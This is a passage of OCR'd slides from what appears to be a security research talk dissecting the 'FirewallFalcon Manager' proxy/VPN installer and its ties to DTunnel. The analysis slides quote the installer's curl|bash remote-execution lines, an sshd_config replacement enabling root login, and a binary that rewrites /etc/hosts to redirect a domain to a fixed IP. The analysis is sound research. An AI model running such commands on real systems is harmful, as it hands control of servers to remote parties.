[10] — Uninstall Falcon Proxy
[11] @ Install/Manage Nginx Proxy (80/443) (Inactive)
[16] @Install ZiVPN (UDP 5667) (Inactive)
[17] — Uninstall ZiVPN
wa MANAGEMENT PANELS ---
[12] gs Install X-UI Panel (Not Installed)
[13] = Uninstall X-UI Panel
[ @] Return to Main Menu
@ Select an option: J
>flare
```

## Slide 61

**LET’S PLAY**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
LET’S PLAY
WebBasePath:
BREE PERS SELLS SSS SSeS ses eSsss ses yessssssssessasa
If you forgot your login info, you can type 'x-ui settings' to check
Start migrating database...
Migration done!
Created symlink /etc/systemd/system/multi-user.target.wants/x-ui.service >
x-ui v1.10.1 installation finished, it is up and running now...
You may access the Panel with following URL(s):
Local address:
Global address:
Control Menu Usage
SUBCOMMANDS :
x-ui Admin Management Script
x-ui start Start
x-ui stop Stop
x-ui restart Restart
x-ui status Current Status
x-ui settings Current Settings
x-ui enable Enable Autostart on OS Startup
x-ui disable Disable Autostart on OS Startup
x-ui log Check Logs
x-ui update Update
x-ui install Install
x-ui uninstall Uninstall
Control Menu Usage
Press [Enter] to return to the menu...
+ flare
```

## Slide 62

### **LET’S PLAY**

Tool’s UI – available on http://IP_ADDRESS:43237/<<Random_String>>

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
LET’S PLAY
Welcome
A user1
Log In
# English
Tool’s UI — available on http://IP_ADDRESS:43237/<<Random_String>>
~flare
```

## Slide 63

**LET’S PLAY**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Overview
Inbounds
Panel Settings
Xray Configs
Log Out
® Security Alert
This connection is not secure. Please avoid entering sensitive information until TLS is activated for data protection.
0.25%
CPU: 2 Cores
Version: | X-UI 1.10.1 Xray 26.2.6
Xray: Running | Stop Restart
System Load: 0.05 | 0.23| 0.13
Server: FlareResearch ) | |Pv4
4 Up: 304 B/s
23.85% 0% 5.77%
RAM: 1.85 GB / 7.75 GB Swap: 0B/0B Disk: 4.42 GB / 76.45 GB
\ Down: 463 B/s
Uptime: Xray 2m | OS 7h
Manage: Logs Config Backup & Restore
Usage: RAM 22.08 MB | Threads 15
5S TCP: 22 5 UDP: 8
& Out: 301.89 MB ® In: 1.01 GB
```

## Slide 64

**LET’S PLAY**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
LET’S PLAY
Ubuntu 24.04.3 LTS | Uptime: 11 hours, 54 minutes
y 5.78% Used | Online Sessions: @
@ Managed Accounts | Sys Load (1m): @.01
Create New User Unlock User Account
Delete User Edit User Details
Renew User Account List Managed Users
Lock User Account Generate Client Config
Protocol Manager Traffic Monitor (Lite)
DT Proxy Manager Block Torrent (Anti-P2P)
®
CloudFlare Free Domain Backup User Data
SSH Banner Config Restore User Data
Auto-Reboot Task Cleanup Expired Users
.
Uninstall Script @] Exit
an option: fj
+ flare
```

## Slide 65

**LET’S PLAY**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
LET’S PLAY
Ubuntu 24.04.3 LTS | Uptime: 11 hours, 59 minutes
7.95% Used | Online Sessions: @
@ Managed Accounts | Sys Load (1m): @.28
f | ye (Installed)
[ 1] 4 Install DT Tunnel (Mod + Proxy)
[ 2] Launch DT Tunnel Management Menu
—~ Uninstall DT Tunnel (Mod + Proxy)
[ @] M Return to Main Menu
@ Select an option: J
```

## Slide 66

**LET’S PLAY**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
LET’S PLAY
DTunnel Proxy Menu
[e1]
[e2]
[e3]
[04]
[00] e EXIT
@ Enter your choice: 1
@ Port: 4
© #7 Enable SSL? (y/n) [n]: y
«© [& Use internal certificate? (y/n) [yl]: y
@ Default HTTP response [FirewallFalcon]: facebook.com
@ @ Enable SSH-only mode? (y/n) [nl]: y
Created symlink /etc/systemd/system/multi-user.target.wants/proxy—-4.service > /etc/systemd/system/proxy—4.service.
7 Proxy started on port 4.
@ Press Enter to continue...
```

## Slide 67

**WHAT IS DTUNNEL?**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
WHAT IS DTUNNEL?
DTunnel
@dtunnel - 343 subscribers - 9 videos
More about this channel ...more
Home Videos Shorts _Live Q
CG 25 dtunnel.com.br/login
S Shorts
© DTUNNEL
Total control,
Descrigdo do uso da
premium interface.
permissao ...
189 views
Access your exclusive control panel to manage tunnels, monitor connectio Videos
and configure integrations through an elegant and easy-to-use interface.
o39 137 113 Bat
DTUNNEL PROTOCOLO COM i Ativando fungao no Dtunnel - i DTunnel - GERANDO : DTUNNEL - COMO ALTERAR i TUTORIAL V2RAY DTUNNEL i DTUNNEL - IMPORTAR
‘SUPORTE A XHTTI Modo avido automatico APLICATIVO AS CREDENCIAIS (USER_ID) K view! years ago CONFIGURACAO,
895 views + 3 mont! 979 views + 2 years agi
+ flare
```

## Slide 68

**DTUNNEL REGISTRATION**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
DTUNNEL REGISTRATION
Create account
Fillin your details to access the new panel.
First name Last name
@gmail.com
Password Confirm password
Register
Already have an account? Sign in
```

## Slide 69

**DTUNNEL REGISTRATION**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
DT
Oo O 8 oO
D
Sb
Jo
DTunnel
Control Center
Home
Settings
App
Texts
Renew
Transactions
Notifications
Devices
Sessions
Profile
Active session
G Sign out
Renew
Choose a plan, apply a coupon if you want, and generate the renewal payment via PIX or card.
RENEWAL PLAN
Plano Mensal
Renewal for 01 meses
01 MESES
FINAL AMOUNT
R$35.00
BASE PRICE
RS$35.00
APPLIED DISCOUNT
RS$0.00
Payment method
$2 PIX © Card
Choose a payment method to continue.
Discount coupon
Enter a discoul Apply
© Renew now
Available
RENEWAL PLAN Available
Plano Trimestral
Renewal for 03 meses
03 MESES
FINAL AMOUNT
R$90.00
BASE PRICE
RS90.00
APPLIED DISCOUNT
RS$0.00
Payment method
2 PIX ®B Card
Choose a payment method to continue.
Discount coupon
Enter a discoui Apply
© Renew now
RENEWAL PLAN Available
Vitalicio
Renewal for 2739 anos
2739 ANOS
FINAL AMOUNT
R$250.00
BASE PRICE
RS$250.00
APPLIED DISCOUNT
RS0O.00
Payment method
2 PIX ® Card
Choose a payment method to continue
Discount coupon
Enter a discoul Apply
© Renew now
RENEWAL PLAN Available
Plano Anual
Renewal for 01 ano
01 ANO
FINAL AMOUNT
R$199.90
BASE PRICE
RS$199.90
APPLIED DISCOUNT
RS0.00
Payment method
o2 PIX ® Card
Choose a payment method to continue.
Discount coupon
Enter a discoui Apply
& Renew now
```

## Slide 70

**I’M FALLING IN LOVE**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
I’M FALLING IN LOVE
+ flare
```

## Slide 71

## Slide 72

### **FOUR INTERESTING ELEMENTS IN THE TOOL**

## Slide 73

**REMEMBER THIS ONE…**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
REMEMBER THIS ONE...
root@ip-—172-31-32-128:~# curl -L -o install.sh "https://raw.githubusercontent.com/firewallfalcons/FirewallFalcon—Manager
/main/install.sh" && chmod +x install.sh && sudo ./install.sh && rm install.sh
% Total % Received % Xferd Average Speed Time Time Time Current
Dload Upload Total Spent Left Speed
10@ 2124 100 2124 () @ 13355 Q@ --t--8-— ti 3-3 -— 13443
sudo: unable to resolve host in-172-31-32-128: Name or service not known
Installing FirewallFalcon Manager...
Applying FirewallFalcon SSH configuration...
SSH configuration validated.
SSH service restarted.
%Initializing FirewallFalcon Manager setup...
a
Configuring user limiter service...
@ Setup finished.
Installation complete!
Type 'menu' to start.
root@ip-172-31-32-128:~# [J
+ flare
```

## Slide 74

### **CHECKING UNDER THE HOOD**

**I know it’s too small don’t worry**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
CHECKING UNDER THE HOOD
echo "Installing FirewallFalcon Manager..."
# URLs (IPv4 forced to avoid GitHub IPv6 issues)
https://raw.githubusercontent.com/firewallfalcons/FirewallFalcon—-Manager/main/menu.sh"
https: //raw.githubusercontent.com/firewallfalcons/FirewallFalcon—Manager/main/ssh"
# Install menu
wget -4 -q -0 /usr/local/bin/menu “$MENU_URL"
chmod +x /usr/local/bin/menu
ec ‘Applying FirewallFalcon SSH configuration..."
SSHD_CONFIG="/etc/ssh/sshd_config"
BACKUP="/etc/ssh/sshd_config.backup.$(date +%F-%H%M%S )"
# Backup current SSH config
cp "“$SSHD_CONFIG" "$BACKUP"
# Download FirewallFalcon SSH config
wget —4 -q -0 "“$SSHD_CONFIG" "$SSHD_URL"
chmod 6@@ “$SSHD_CONFIG"
# Validate SSH config (silent)
if ! sshd -t 2>/dev/null; then
echo "ERROR: SSH configuration is invalid!"
echo "Restoring previous configuration..."
cp "$BACKUP" "$SSHD_CONFIG"
exit 1
fi
echo "SSH configuration validated."
+flare
I know it’s
too small
don’t
worry
```

## Slide 75

**CHECKING UNDER THE HOOD**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
CHECKING UNDER THE HOOD C)
echo "Installing FirewallFalcon Manager..."
```

## Slide 76

**CHECKING UNDER THE HOOD**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
CHECKING UNDER THE HOOD C)
echo "Installing FirewallFalcon Manager..."
SSHD_URL="https://raw.githubusercontent.com/firewallfalcons/FirewallFalcon—Manager/main/ssh"
```

## Slide 77

**CHECKING UNDER THE HOOD**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
CHECKING UNDER THE HOOD C)
echo "Installing FirewallFalcon Manager...
SSHD_URL="https://raw.githubusercontent.com/firewallfalcons/FirewallFalcon—Manager/main/ssh"
# Download FirewallFalcon SSH config
wget -4 -q -0 "$SSHD_CONFIG" "$SSHD_URL"
chmod 6@@ "$SSHD_CONFIG"
```

## Slide 78

**CHECKING UNDER THE HOOD**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
CHECKING UNDER THE HOOD C)
echo "Installing FirewallFalcon Manager..."
SSHD_URL="https://raw.githubusercontent.com/firewallfalcons/FirewallFalcon—Manager/main/ssh"
# Download FirewallFalcon SSH config
wget -4 -q -0 "$SSHD_CONFIG" "$SSHD_URL"
chmod 60@ "$SSHD_CONFIG"
SSHD_CONFIG="/etc/ssh/sshd_config"
BACKUP=""/etc/ssh/sshd_config.backup.$(date +%F—%H%M%sS ) "
```

## Slide 79

**CHECKING UNDER THE HOOD**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
CHECKING UNDER THE HOOD
echo "Installing FirewallFalcon Manager..."
SSHD_URL="https://raw.githubusercontent.com/firewallfalcons/FirewallFalcon—Manager/main/ssh"
# Download FirewallFalcon SSH config
wget -4 -q -0 "$SSHD_CONFIG" "$SSHD_URL"
chmod 6@@ "$SSHD_CONFIG"
SSHD_CONFIG="/etc/ssh/sshd_config"
BACKUP=""/etc/ssh/sshd_config.backup.$(date +%F—%H%M%sS ) "
if ! sshd -t 2>/dev/null; then
echo "ERROR: SSH configuration is invalid!"
echo "Restoring previous configuration..."
cp "“$BACKUP" "$SSHD_CONFIG"
exit 1
```

## Slide 80

### **CHECKING UNDER THE HOOD**

→ **"/etc/ssh/sshd_config"**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
CHECKING UNDER THE HOOD
€ Cc 23 codeberg.org/firewallfalcons/FirewallFalcon-Manager/raw/branch/main/ssh
# FIREWALLFALCON
#
Port 22
Protocol 2
KeyRegenerationInterval 3600
ServerKeyBits 1024
SyslogFacility AUTH
LogLevel INFO
[cermitrootLogin yes}
lo yes
RSAAuthentication yes
PubkeyAuthentication yes
IgnoreRhosts yes ° ll
RhostsRSAAuthentication no > /etc/ss h/sshd config
HostbasedAuthentication no =
PermitEmptyPasswords no
PermitTunnel yes
B e bhentication no
TForward
Xl1DisplayOffset 10
PrintMotd no
PrintLastLog yes
TCPKeepAlive yes
#UseLogin no
AcceptEnv LANG LC_*
Subsystem sftp /usr/lib/openssh/sftp-server
UsePAM yes
Banner /etc/bannerssh
+ flare
```

## Slide 81

**BUT, OPENING SSH TO THE INTERNET IS PART OF THE TOOL…**

## Slide 82

### **FOUR INTERESTING ELEMENTS IN THE TOOL**

## Slide 83

**REMEMBER THIS ONE…**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
REMEMBER THIS ONE...
[ei
[e1]
[e2]
[e3]
[04]
[00] e EXIT
@ Enter your choice: 1
@ Port: 4
© #7 Enable SSL? (y/n) [n]: y
«© [& Use internal certificate? (y/n) [yl]: y
@ Default HTTP response [FirewallFalcon]: facebook.com
@ @ Enable SSH-only mode? (y/n) [nl]: y
Created symlink /etc/systemd/system/multi-user.target.wants/proxy—-4.service > /etc/systemd/system/proxy—4.service.
7 Proxy started on port 4.
@ Press Enter to continue...
+ flare
```

## Slide 84

### **CHECKING UNDER THE HOOD**

**I know it’s too small don’t**

**I know it’s too small don’t**

**worry**

**worry**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
CHECKING UNDER THE HOOD
install_dt_proxy_full() {
cle show_banner
echo -e “${C_BOLD}${C_PURPLE}— Y Full DT Tunnel Installation ---${C_RESET}"
if [ -f "/usr/local/bin/main" ]; then
echo -e "\n${C_YELLOW} [il DT Proxy appears to be already installed.${C_RESET}"
echo -e “If you wish to reinstall, please uninstall it first."
return
fi
echo -e "\n${C_BLUE}--- Step 1 of 2: Installing DT Tunnel Mod ---${C_RESET}"
He
| know it S echo "This will download and run the prerequisite mod installer."
read -p "# Press [Enter] to continue or [Ctrl+C] to cancel."
too sma [| if curl -sL https://raw.githubusercontent.com/firewallfalcons/ProxyMods/main/install.sh | bash; then
echo -e "\n${C_GREEN}@ DT Tunnel Mod installed successfully. ${C_RESET}"
else
d 't echo -e "\n${C_RED} ERROR: DT Tunnel Mod installation failed. Aborting.${C_RESET}"
Oo n return
fi
worr echo -e "\n${C_BLUE}--- Step 2 of 2: Installing DT Tunnel Proxy ---${C_RESET}"
echo "This will download and run the main DT Tunnel proxy installer."
read -p “# Press [Enter] to continue or [Ctrl+C] to cancel."
if bash <(curl -fsSL https://raw.githubusercontent.com/firewallfalcons/ProxyDT-Go-Releases/main/install.sh); then
echo -e "\n${C_GREEN}@ DT Tunnel Proxy installed successfully.${C_RESET}"
echo -e "You can now manage it from the DT Proxy Management menu."
else
echo -e "\n${C_RED}X ERROR: DT Tunnel Proxy installation failed.${C_RESET}"
fi
+flare
I know it’s
too small
don’t
worry
```

## Slide 85

**CHECKING UNDER THE HOOD**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
CHECKING UNDER THE HOOD C)
if curl -sL https://raw.githubusercontent.com/firewallfalcons/ProxyMods/main/install.sh | bash; then
echo -e "\n${C_GREEN}@ DT Tunnel Mod installed successfully.${C_RESET}"
```

## Slide 86

**CHECKING UNDER THE HOOD**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
CHECKING UNDER THE HOOD
#!/b
set -e
echo "firewallfalcon" > "$HOME/.proxy_token"
URL_X86_64="https://github.com/firewallfalcons/ProxyMods/raw/refs/heads/main/install_mod"
URL_ARM64="https://github.com/firewallfalcons/ProxyMods/raw/refs/heads/main/Arminstall_mod"
FILENAME="install_mod"
echo "# Detecting your server's architecture..."
ARCH=$(uname —m)
case $ARCH in
x86_64
echo "@ Detected x86_64 (Intel/AMD 64-bit)."
DOWNLOAD_URL=""$URL_X86_64"
an
aarch64
echo "@ Detected aarch64 (ARM 64-bit)."
DOWNLOAD_URL=""$URL_ARM64"
echo Unsupported architecture: $ARCH"
echo "This installer only supports x86_64 and aarch64."
exit 1
”
+flare
```

## Slide 87

**CHECKING UNDER THE HOOD**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
CHECKING UNDER THE HOOD
#!/b
set -e
echo "firewallfalcon" > "$HOME/.proxy_token"
URL_X86_6 ttps://github.com/firewallfalcons/ProxyMods/raw/refs/heads/main/install_mod"
URL_ARM64: ttps://github.com/firewallfalcons/ProxyMods/raw/refs/heads/main/Arminstall_mod"
FLLENAME="ifistat t_moe™
echo "# Detecting your server's architecture..."
ARCH=$(uname —m)
case $ARCH in
x86_64
echo "@ Detected x86_64 (Intel/AMD 64-bit).
DOWNLOAD_URL=""$URL_X86_64"
an
aarch64
echo "@ Detected aarch64 (ARM 64-bit)."
DOWNLOAD_URL=""$URL_ARM64"
echo Unsupported architecture: $ARCH"
echo "This installer only supports x86_64 and aarch64."
exit 1
”
+ flare
```

## Slide 88

### **CHECKING UNDER THE HOOD**

**I know it’s too small don’t**

**worry**

**I know it’s too small don’t worry**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
CHECKING UNDER THE HOOD
I know it’s
too small
don’t
worry
+ flare
root@ip-172-31-32-128:~# curl -k https://proxy.dtunnel.com.br/api/v1/token/validate/firewallfalcon
{"data":{"is_valid":true}, "status":200}
root@ip—172-31-32-128:~# curl -vk https://proxy.dtunnel.com.br/api/v1/token/validate/firewallfalcon
Host proxy.dtunnel.com.br:443 was resolved.
IPv6: (none)
IPv4: 89.168.51.93
Trying 89.168.51.93:443...
Connected to proxy.dtunnel.com.br (89.168.51.93) port 443
ALPN: curl offers h2,http/1.1
TLSv1.3 (OUT), TLS handshake, Client hello (1
TLSv1.3 (IN), TLS handshake, Server hello (2)
TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8):
TLSv1.3 (IN), TLS handshake, Certificate (11)
TLSv1.3 (IN), TLS handshake, CERT verify (15):
TLSv1.3 (IN), TLS handshake, Finished (20):
TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1):
TLSv1.3 (OUT), TLS handshake, Finished (20):
SSL connection using TLSv1.3 / TLS_AES_128_GCM_SHA256 / X25519 / RSASSA-PSS
ALPN: server accepted h2
Server certificate:
subject: Cl roxy.dtunnel.com.br
start date: Sep 23 12:46:25 2025 GMT
expire date: Aug 2 12:46:25 2035 GMT
issuer: CN=proxy.dtunnel.com.br
SSL certificate verify result: self-signed certificate (18), continuing anyway.
Certificate level @: Public key type RSA (2048/112 Bits/secBits), signed using sha256WithRSAEncryption
TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
using HTTP/2
CHTTP/2] [1] OPENED stream for https://proxy.dtunnel.com.br/api/v1/token/validate/firewallfalcon
CHTTP/2] [1] [:method: GET]
CHTTP/2] [1] [:scheme: https]
CHTTP/2] [1] [:authority: proxy.dtunnel.com.br]
CHTTP/2] [1] [:path: /api/v1/token/validate/firewallfalcon]
CHTTP/2] [1] [user-agent: curl/8.5.0]
CHTTP/2] [1] Laccept: */*]
GET /api/v1/token/validate/firewallfalcon HTTP/2
Host: proxy.dtunnel.com.br
User-Agent: curl/8.5.0
Accept: */*
3
3
3
3
3
3
HTTP/2 200
content-type: application/json
content-length: 40
date: Mon, 09 Mar 2026 23:40:47 GMT
*
*
*
*
*
*
*
*
*
*
*
*
*
*
*
*
*
*
*
*
*
*
*
*
*
*
*
*
*
*
*
*
>
>
>
>
>
<
<
<
<
<
{"data":{"is_valid":true}, "status":200}
* Connection #@ to host proxy.dtunnel.com.br left intact
I know it’s
too small
don’t
worry
```

## Slide 89

**CHECKING UNDER THE HOOD (LET’S BREAK IT DOWN)**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
CHECKING UNDER THE HOOD (LET’S BREAK IT DOWN) a
root@ip-172—-31-32-128:~# cat .proxy_token
firewallfalcon
root@ip-172-31-32-128:~# curl -k https://proxy.dtunnel.com.br/api/v1/token/validate/firewallfalcon
{"data":{"is_valid":true}, "status":200}
root@ip-172-31-32-128:~# ff
+ flare
```

## Slide 90

**CHECKING UNDER THE HOOD (LET’S BREAK IT DOWN)**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
CHECKING UNDER THE HOOD (LET’S BREAK IT DOWN)
root@ip-172-31-32-128:~# curl -vk https://proxy.dtunnel.com.br/api/v1/token/validate/firewallfalcon
Host proxy.dtunnel.com.br:443 was resolved.
IPv6: (none)
IPv4: 89.168.51.93
Trying 89.168.51.93:443...
Connected to proxy.dtunnel.com.br (89.168.51.93) port 443
ALPN: curl offers h2,http/1.1
*
*
*
*
*
*
+ flare
```

## Slide 91

### **CHECKING UNDER THE HOOD (LET’S BREAK IT DOWN)**

89.168.51.93

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
CHECKING UNDER THE HOOD (LET’S BREAK IT DOWN) a
§9.168.91.93
root@ip-172-31-32-128:~# curl -vk httpse#/7proxy.dtunnel.com.br/api/v1/token/validate/firewallfalcon
Host proxy.dtunnel.com.br:443 wasfesolved.
IPv6: (none) >
IPv4: 89.168.51.93 a
Trying 89.168.51.93:443...
Connected to proxy.dtunnel.com.br (89.168.51.93) port 443
ALPN: curl offers h2,http/1.1
*
*
*
*
*
*
+ flare
```

## Slide 92

**DIG TO DTUNNEL FROM A CLEAN VM**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
DIG TO DTUNNEL FROM A CLEAN VM
ubuntu@FlareResearch:~$ dig proxy.dtunnel.com.br
; <<>> DIG 9.18.39-@ubuntu@.24.04.2—Ubuntu <<>> proxy.dtunnel.com.br
+; global options: +cmd
7; Got answer:
7} —>>HEADER<<- opcode: QUERY, status: NOERROR, id: 56082
i; flags: qr rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: @, ADDITIONAL: 1
7; OPT PSEUDOSECTION:
; EDNS: version: @, flags:; udp: 65494
77 QUESTION SECTION:
;proxy.dtunnel.com.br. IN
7; ANSWER SECTION:
proxy.dtunnel.com.br. 300 IN 104.21.81.128
proxy.dtunnel.com.br. 300 IN 172.67.160.230
37 Query time: 39 msec
7; SERVER: 127.0.0.53#53(127.0.0.53) (UDP)
7; WHEN: Mon Mar @9 23:43:12 UTC 2026
77 MSG SIZE revd: 81
ubuntu@FlareResearch:~$ ff
```

## Slide 93

### **DIG TO DTUNNEL FROM A CLEAN VM**

104.21.81.128

172.67.160.230

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
DIG TO DTUNNEL FROM A CLEAN VM
ubuntu@FlareResearch:~$ dig proxy.dtunnel.com.br
; <<>> DIG 9.18.39-@ubuntu@.24.04.2—Ubuntu <<>> proxy.dtunnel.com.br
+; global options: +cmd
7; Got answer:
3 —>>HEADER<<- opcode: QUERY, status: NOERROR, id: 56082
i; flags: qr rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: @, ADDITIONAL: 1
ee 404.94.81.498
; EDNS: version: @, flags:; udp: 65494 ® ® e
'
77 QUESTION SECTION:
;proxy.dtunnel.com.br. IN
7; ANSWER SECTION:
proxy.dtunnel.com.br. 300 IN 104.21.81.128
proxy.dtunnel.com.br. 300 IN 172.67.160.230
37 Query time: 39 msec
;; SERVER: 127.0.0.53#53(127.0.0.53) (UDP)
7; WHEN: Mon Mar @9 23:43:12 UTC 2026
ubuntu@FlareResearch:~$ [] e@ e@ e
+ flare
```

## Slide 94

**API AUTHENTICATION TO DTUNNEL FROM A CLEAN VM**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
API AUTHENTICATION TO DTUNNEL FROM A CLEAN VM a
ubuntu@FlareResearch:~/Research/February-26/FirewallFalcon$ cat .proxy_token
firewallfalcon
ubuntu@FlareResearch: ~/Research/February-26/Fir 11Falcon$ curl -k https://proxy.dtunnel.c
om-hr/ani/v1/toaken/validate/firewal
{"data":{"error":"'ip_address'"},"status":50Q}
+ flare
```

## Slide 95

**API AUTHENTICATION TO DTUNNEL FROM A CLEAN VM**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
API AUTHENTICATION TO DTUNNEL FROM A CLEAN VM a
ubuntu@FlareResearch:~/Research/February-26/FirewallFalcon$ cat .proxy_token
firewallfalcon
ubuntu@FlareResearch:~/Research/February-26/FirewallFalcon$ curl -k https://proxy.dtunnel.c
om.br/ani/yt /token/validate/firemwallfalcon
{"data":{"error":"'ip_address'"},"status":500}
root@ip-—172-31-32-128:~# cat .proxy_token
firewallfalcon
SOOT OFS A1 79H 9429-190 2 th tie] ttn eS
2=34-22-2:26+-# curd —|-attos://proxy.dtunnel.com.br/api/v1/token/validate/firewallfalcon
{"data":{"is_ valid": true}, "status": 200}
TOOtWip=17 2Z—31=3S 2-128. ~# a
+ flare
```

## Slide 96

**LET’S CHECK THE HOSTS FILE**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
LET’S CHECK THE HOSTS FILE
root@ip-172-31-32-128:~# cat /etc/hosts && echo
127.0.@.1 localhost
The following lines are desirable for IPv6é capable hosts
21 ipé6-localhost ip6—-loopback
fe0e:: ip6—localnet
ff00::8 ipé6é—mcastprefix
ff02::1 ipé6—allnodes
ff02::2 ip6é—-allrouters
ff02::3 ipé6—allhosts
89.168.51.93 proxy.dtunnel.com.br
root@ip-172-31-32-128:~# ff
```

## Slide 97

**LET’S CHECK THE HOSTS FILE**

## Slide 98

**REMEMBER THIS ONE…**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
REMEMBER THIS ONE...
#!/b
set -e
echo "firewallfalcon" > "$HOME/.proxy_token"
URL_X86_6 ttps://github.com/firewallfalcons/ProxyMods/raw/refs/heads/main/install_mod"
URL_ARM64: ttps://github.com/firewallfalcons/ProxyMods/raw/refs/heads/main/Arminstall_mod"
FLLENAME="iftStat t_moc
echo "# Detecting your server's architecture..."
ARCH=$(uname —m)
case $ARCH in
x86_64
echo "@ Detected x86_64 (Intel/AMD 64-bit).
DOWNLOAD_URL=""$URL_X86_64"
an
aarch64
echo "@ Detected aarch64 (ARM 64-bit)."
DOWNLOAD_URL=""$URL_ARM64"
echo Unsupported architecture: $ARCH"
echo "This installer only supports x86_64 and aarch64."
exit 1
”
+flare
```

## Slide 99

**LET’S CHECK THIS BINARY (INSTALL_MOD)**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
LET’S CHECK THIS BINARY (INSTALL_MOD)
; DATA XREF: main_main+B4to
; Main_main: loc_4A7AFBrto
+ flare
@ AB x)
Loc_4A7AFB: ; Name
lea rax, aEtcHosts ; "/etc/hosts"
mov ebx, Ah > Name
mov ecx, 401h ; flag ; const uint8 aEtcHosts
mov edi, 1A4h + perm aEtcHosts db '/etc/hosts'
call os_OpenFile
f = rax ; oS_File_® *
err = rbx >; error_O
test err, err
jnz loc_4A7C1D
@ A =| @ & =|
movups xmmword ptr [rsp+4F@h+a.cap], xmm15
loc_4A7C1D: lea rdx, main_main_deferwrap1
add rsp, 4E8h mov [rsp+4F@h+a.cap], rdx
pop rbp mov [rsp+4FQh+var_18], f
retn lea rdx, [rsp+4F0h+a.cap]
mov [rsp+4F@h+var_10], rdx
mov [rsp+4F@h+var_4BF], 1
lea err, a891685193Proxy_@ ; "\n89.168.51.93 proxy.dtunnel.com.br"
neg rbx
xchg ax, ax
cmp rbx, 22h ; ‘"'
jb loc_4A7C41
7
```

## Slide 100

**LET’S CHECK THIS BINARY (INSTALL_MOD)**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
LET’S CHECK THIS BINARY (INSTALL_MOD)
+ flare
local_49e = 0x4745422d2d2d2d2d;
local_496._@ 8 = 0x4954524543204e49;
pcVar2 =
“TIFICATE—-—--\nMIIDGj CCAgKgAWIBAgIUYwt 1g+OmUz8BMRCKj QhpzQ8cr/owDQYJKoZIhvcNAQEL \nBQAwHZEdMBsGA1UE
AwwUcHJveHkuZHR1bm5 LbC5 j b2@uYnIwHhcNMj UwOTIZMT10\nNj 11WhcNMZUWODAyMT ION j I1Wj AfMR@wGwYDVQQDDBRwcm94
eS5kdHVubmVsLmNv\nbS5icj CCASIWDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAK81paxa0CFxjQjs\nTbosm7TKV/G4S6
14105GA0+5023YYXp2nRhVCFqoj BJ@GQFfkiSoVKORm7 ZNLWLsB\nHOX0TJ4m7FBMtychc7NN7ob4KN7Mhn9z0qVNOiBZ4M7p5e
83XvZ0i9ev1aPBaA8B\nDsvouXZYJE6ONV LwMo1H104hfApp lzMdh/zB7/9zJc/KGNH5+JV6wp1bj /S5gKPh\nccCM5cUv5Fzi
MxptFP4NfcUQSj+3KSD4U40 LU+ZUJKFuj YNM7Ur3NzDyBa2 idyP6\n2CQvpIPaBcRmj bt2913QU2qW+St35VTaMGJ ruqZZgHga
71dSxFvOFQACnbq950hA\n6BwL 2HUCAWEAAaNOMEwwKwY DVRORBCQwIOIOZHR1bm5 LbC5 j b2@uUYnKCECouZHR1\nbm5 1bC5j b2
@uYnIWwHQYDVRO@OBBYEF) j RNwWIVVgiU8JT1SQiZ91j vt LUAMA@GCSqG\nSIb3DQEBCWUAA4 IBAQA76HWBik Lhgv0/5wt WN/17ez
JZHUsZgj URMFY6GONQn IM2F\ n@aFHGxhhIqwY7y/yyKmrsaimkh L9@SuxkK4Q6mJto/bsGkhtDaBbqM lwaKYBhZJoD\nze/PlezG
srQNzxf501CB+ZmTbucg@Mj pj 73SwKhF55pJ29rsDIWFB4G3zfmuov8t \ng LLNOX6UrKxUEhhiVrq0p+AgDb81YYYE/@v80zre
@kh21PYHf35sSj do5EFHi653\nBay/Ucl82K9TpVTAQyFZ1YzYUxs4WLuutBY kwkzc jN8RZSFHQ6y j XueIgoSXVEsX\nIhFhv1
6TITLSBK@1kQgW9PzjOZD1kgyXHdyaOvW1\n—----END CERTIFICATE---——' "
puVar3 = (undefined8 *)(local_496 + 6);
for (lWarl = Ox8c; lVarl != @; Warl = lWarl + -1) {
x*puVar3 = *(undefined8 *)pcVar2;
pcVar2 = pcVar2 + ((ulong)bVar5 * -2 + 1) * 8;
puVar3 = puVar3 + (ulong)bVar5 * -2 + 1;
+
